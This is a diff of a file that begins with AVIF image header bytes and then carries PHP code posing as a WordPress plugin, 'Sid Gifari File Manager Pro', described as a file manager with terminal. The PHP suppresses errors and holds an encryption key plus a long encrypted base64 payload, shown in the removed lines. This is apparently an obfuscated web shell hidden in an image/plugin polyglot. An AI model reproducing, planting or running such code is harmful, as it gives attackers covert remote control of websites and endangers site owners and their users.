@@ -1,6 +1,991 @@
+   ftypavif    mif1avifmiaf   Ömeta       !hdlr        pict                pitm        "iloc    D@       ú       :¤   #iinf        infe      av01    Viprp   8ipco   av1C!    ispe      €  h   pixi       ipma          :¬mdat 
+
+8f'û;Hh4€2“u˜É(a†È  oÏÍª"ÂøÐKôÃn×½àÄ¶ïÏõ*û?Df²[a²„ël×Ê2c¾5MEÓWønxUFçŠVó’ïkPÔ‘ð‚…4|¡Ûà:ŠØØòƒ4EáÆgzË6b’YZs§»¬BçÜ i‹‚ÙØ`ÄK÷>ºê4äüN«¯Yõ²MøÉßp¦5ÆË4,Øt  `Ðœ‘ûìùcåÀ6öq½ü´“æ?æ2ÑÇÚ—FQŠÛº x€dÜ%á!~[7¼&¨d‘SYƒîQä•+3%)¢©t¨æÖËœ5ˆªi%ï>#OŒÐÙxœP®++¼xRë.Ìíam)§FGsdágª2£c—øuk²ã|
+ÞeÀž?çå‡~/ïÕœu™å¢$x†˜àn±Ã…LÜ ZkÀº÷Ø¿8ÒšMÏÈ`ØÿÓ‘žòl’ƒri;W?SDB Í}R#hï‹?!¯Ç¾[\ê=h˜ò~K©³ÄÝMUp_åµš™k6)c¥*~àýÏÚ
+Ô->h4SZ”„¹©¼MdÂÀc“çÄèúµ†Ñ›¥«…Üû)©£U»X…]*éµÇ2éÚ`ª–ìÔ%“èÏR;‰ý—<—/#vÒ(|4©[mä“C3bêVóšèfw¥ÁðFAâ	D"º”ß¼À!g7òà¢ª¿ŠÊJIl“‘^EµmMr.DÝ«Äaß
+´Ùˆí‹½[Iª‹6°§9öŠovu±HÓÑIVƒU˜	¾¤”YcO=~_ÓGÝÅç˜óÄO\ñ%'3ô?º¢r·	¤CûêJ3.}a¯¿.~çË©õžºÔŒ¨ÉnéU¦0LrVM:@
+O`Óõ¤[QË¦Éx€XØý0\z³UŸx>šPá÷¹SÚ¹¿šû¡6}N
+<?xml version="1.0"?>
 <?php
+/**
+ * Plugin Name: Sid Gifari File Manager Pro
+ * Plugin URI: https://t.me/sidgifari
+ * Description: Sid Gifari Advanced file manager with terminal
+ * Version: 8.0.2
+ * Author: Sid Gifari
+ * License: GPLv2
+ * Text Domain: SidGifari-File-Manager
+ */
 error_reporting(0);
-ini_set('display_errors', 0);
-$kunci = 'kontolfucknoob';
-$data = '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